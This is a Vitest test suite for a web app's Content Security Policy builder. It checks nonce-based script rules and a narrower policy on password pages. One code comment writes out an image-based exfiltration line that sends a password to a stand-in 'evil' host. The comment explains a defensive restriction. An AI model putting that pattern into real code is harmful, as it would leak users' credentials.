import { describe, expect, it } from 'vitest';

import { buildContentSecurityPolicy, generateNonce } from './content-security-policy';

const build = (isDevelopment: boolean, realtimeUrl?: string) =>
  buildContentSecurityPolicy({ nonce: 'TESTNONCE', realtimeUrl, isDevelopment });

describe('buildContentSecurityPolicy', () => {
  it('authorises scripts by nonce, never by unsafe-inline', () => {
    const policy = build(false);
    expect(policy).toContain("script-src 'self' 'nonce-TESTNONCE' 'strict-dynamic'");
    expect(policy).not.toContain("script-src 'self' 'unsafe-inline'");
  });

  it('never permits unsafe-eval in production', () => {
    expect(build(false)).not.toContain('unsafe-eval');
  });

  it('permits unsafe-eval in development only, for the dev runtime', () => {
    expect(build(true)).toContain('unsafe-eval');
  });

  it('blocks framing and plugins outright', () => {
    const policy = build(false);
    expect(policy).toContain("frame-ancestors 'none'");
    expect(policy).toContain("object-src 'none'");
  });

  it('pins base-uri, so an injected <base> cannot repoint relative URLs', () => {
    expect(build(false)).toContain("base-uri 'self'");
  });

  it('allows the realtime gateway over both https and wss', () => {
    const policy = build(false, 'https://dev.gotcha.co.il');
    expect(policy).toContain('https://dev.gotcha.co.il');
    expect(policy).toContain('wss://dev.gotcha.co.il');
  });

  it('omits realtime origins entirely when none is configured', () => {
    expect(build(false)).toContain("connect-src 'self';");
  });

  it('upgrades insecure requests in production only', () => {
    expect(build(false)).toContain('upgrade-insecure-requests');
    expect(build(true)).not.toContain('upgrade-insecure-requests');
  });
});

describe('generateNonce', () => {
  it('produces a fresh value every call', () => {
    const values = new Set(Array.from({ length: 50 }, generateNonce));
    expect(values.size).toBe(50);
  });

  it('produces enough entropy to be unguessable', () => {
    // 16 random bytes base64-encoded.
    expect(generateNonce()).toHaveLength(24);
  });
});

describe('★★ a page where somebody types a password gets a narrower policy', () => {
  const policy = (credentialSurface: boolean) =>
    buildContentSecurityPolicy({
      nonce: 'n',
      realtimeUrl: 'https://realtime.gotcha.co.il',
      isDevelopment: false,
      credentialSurface,
    });

  /** The directives, parsed, so an assertion cannot pass on a substring. */
  const directive = (csp: string, name: string): string[] => {
    const found = csp
      .split('; ')
      .map((part) => part.split(' '))
      .find((parts) => parts[0] === name);
    return found ? found.slice(1) : [];
  };

  it('★★ drops the `https:` wildcard from img-src, which is an exfiltration channel', () => {
    /*
     * ════════════════════════════════════════════════════════════════════════
     * THE ONE THAT MATTERS, AND THE ONE THAT LOOKS HARMLESS
     * ════════════════════════════════════════════════════════════════════════
     * `new Image().src = 'https://evil/?p=' + password` carries the value off the
     * page over a channel `connect-src` does not govern. The general policy
     * allows `https:` because a merchant's product photos come from wherever
     * their shop hosts them; **the sign-in screen renders none of that** - its
     * only image is an inline SVG - so the wildcard buys nothing there.
     */
    expect(directive(policy(true), 'img-src')).toEqual(["'self'", 'data:']);
    expect(directive(policy(false), 'img-src')).toContain('https:');
  });

  it('★★ closes media-src and frame-src, which are the same channel in other tags', () => {
    expect(directive(policy(true), 'media-src')).toEqual(["'none'"]);
    expect(directive(policy(true), 'frame-src')).toEqual(["'none'"]);
  });

  it('★★ drops the realtime origins, which nothing uses before sign-in', () => {
    /*
     * Every extra origin in `connect-src` is a destination an injected script may
     * post to. Realtime is not reachable to somebody who has not authenticated,
     * so it is pure surface on this route.
     */
    expect(directive(policy(true), 'connect-src')).toEqual(["'self'"]);
    expect(directive(policy(false), 'connect-src')).toContain('https://realtime.gotcha.co.il');
  });

  it('★★ keeps the executor reachable, or the panel cannot sign anybody in', () => {
    /*
     * The narrowing must not break the thing it protects. The flow executor is
     * same-origin through the gateway's `/v2/auth-api/` proxy, so `'self'`
     * covers it - which is another reason that proxy is better than CORS.
     */
    expect(directive(policy(true), 'connect-src')).toContain("'self'");
  });

  it('★★ keeps the nonce and strict-dynamic, which are what make any of this work', () => {
    /*
     * A narrower policy that lost the script rules would be a downgrade wearing
     * the clothes of an upgrade. Both policies keep them.
     */
    for (const csp of [policy(true), policy(false)]) {
      expect(directive(csp, 'script-src')).toContain("'nonce-n'");
      expect(directive(csp, 'script-src')).toContain("'strict-dynamic'");
      expect(directive(csp, 'object-src')).toEqual(["'none'"]);
      expect(directive(csp, 'base-uri')).toEqual(["'self'"]);
      expect(directive(csp, 'form-action')).toEqual(["'self'"]);
      expect(directive(csp, 'frame-ancestors')).toEqual(["'none'"]);
    }
  });

  it('★ leaves every other route exactly as it was', () => {
    // The app renders customer photos all day. A narrowing that leaked into the
    // rest of the product would break avatars and look like a backend failure.
    expect(policy(false)).toBe(
      buildContentSecurityPolicy({
        nonce: 'n',
        realtimeUrl: 'https://realtime.gotcha.co.il',
        isDevelopment: false,
      }),
    );
  });
});

describe('★★ the policy stands on its own, because it is not the only one', () => {
  /*
   * ════════════════════════════════════════════════════════════════════════════
   * A RESPONSE AT `/v2/en/sign-in` CARRIES TWO CSP HEADERS
   * ════════════════════════════════════════════════════════════════════════════
   * Ours, and a wider one from the gateway. The browser enforces both and the
   * effective policy is the intersection, so our narrowing holds - but the
   * gateway defines its policy in **nine** places with different values per
   * block, and nginx's `add_header` inheritance is all-or-nothing: a block that
   * defines any header drops every inherited one.
   *
   * So the other policy can change, or vanish, without anybody touching our
   * code. This asserts the property that makes that survivable: **we name every
   * directive we rely on**, rather than letting one fall through to the other
   * policy or to `default-src`.
   */
  const required = [
    'default-src',
    'script-src',
    'style-src',
    'img-src',
    'font-src',
    'connect-src',
    'media-src',
    'object-src',
    'base-uri',
    'form-action',
    'frame-ancestors',
    'frame-src',
  ];

  it('★★ names every directive it relies on, on both surfaces', () => {
    for (const credentialSurface of [true, false]) {
      const csp = buildContentSecurityPolicy({
        nonce: 'n',
        realtimeUrl: 'https://realtime.gotcha.co.il',
        isDevelopment: false,
        credentialSurface,
      });
      const named = csp.split('; ').map((part) => part.split(' ')[0]);
      for (const directive of required) {
        expect(named, `${directive} missing (credentialSurface=${credentialSurface})`).toContain(
          directive,
        );
      }
    }
  });

  it('★★ does not lean on `default-src` for the ones that matter most', () => {
    /*
     * `default-src` is a fallback, and a fallback is what a reader stops reading
     * at. `img-src` and `connect-src` are the two exfiltration channels on the
     * credential surface; both are stated explicitly so that narrowing one is a
     * visible edit rather than a consequence of editing something else.
     */
    const csp = buildContentSecurityPolicy({
      nonce: 'n',
      isDevelopment: false,
      credentialSurface: true,
    });
    expect(csp).toContain("img-src 'self' data:");
    expect(csp).toContain("connect-src 'self'");
  });
});

describe('★★ 13c - Meta’s frames on the channels pages, and nowhere else', () => {
  const frames = (options: { metaSignupSurface?: boolean; credentialSurface?: boolean }) =>
    buildContentSecurityPolicy({ nonce: 'N', isDevelopment: false, ...options })
      .split(';')
      .map((d) => d.trim())
      .find((d) => d.startsWith('frame-src'));

  it('the channels surface frames www/web.facebook.com - not a wildcard', () => {
    expect(frames({ metaSignupSurface: true })).toBe(
      "frame-src 'self' https://www.facebook.com https://web.facebook.com",
    );
  });

  it('elsewhere: self only; a password page: none, even if both were claimed', () => {
    expect(frames({})).toBe("frame-src 'self'");
    expect(frames({ metaSignupSurface: true, credentialSurface: true })).toBe("frame-src 'none'");
  });
});
